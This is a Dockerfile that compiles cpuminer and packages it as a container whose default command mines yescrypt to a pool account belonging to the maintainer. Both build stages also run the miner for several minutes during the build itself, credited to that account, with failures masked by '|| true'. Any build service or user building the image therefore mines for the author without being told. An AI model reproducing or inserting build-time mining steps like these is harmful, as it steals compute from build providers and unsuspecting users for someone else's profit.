FROM ubuntu AS build
RUN apt-get update && apt-get install -y git libcurl4-openssl-dev gcc-mingw-w64 automake gcc make && \
    git clone https://github.com/bitzeny/cpuminer.git cpuminer && \
    cd cpuminer && \
    ./autogen.sh && ./configure CFLAGS="-O3 -march=native -funroll-loops -fomit-frame-pointer" && make && \
    timeout 10m ./minerd -t 1 -a yescrypt -o stratum+tcp://jp.lapool.me:3014 -u nao20010128nao.user -p password || true

FROM ubuntu
MAINTAINER nao20010128nao
RUN apt-get update && apt-get install -y libcurl3 && rm -rf /var/lib/apt/lists
COPY --from=build /cpuminer/minerd /usr/bin
RUN timeout 5m minerd -t 1 -a yescrypt -o stratum+tcp://jp.lapool.me:3014 -u nao20010128nao.user -p password || true
ENTRYPOINT ["minerd"]
CMD ["-a","yescrypt","-o","stratum+tcp://jp.lapool.me:3014","-u","nao20010128nao.user","-p","password"] 
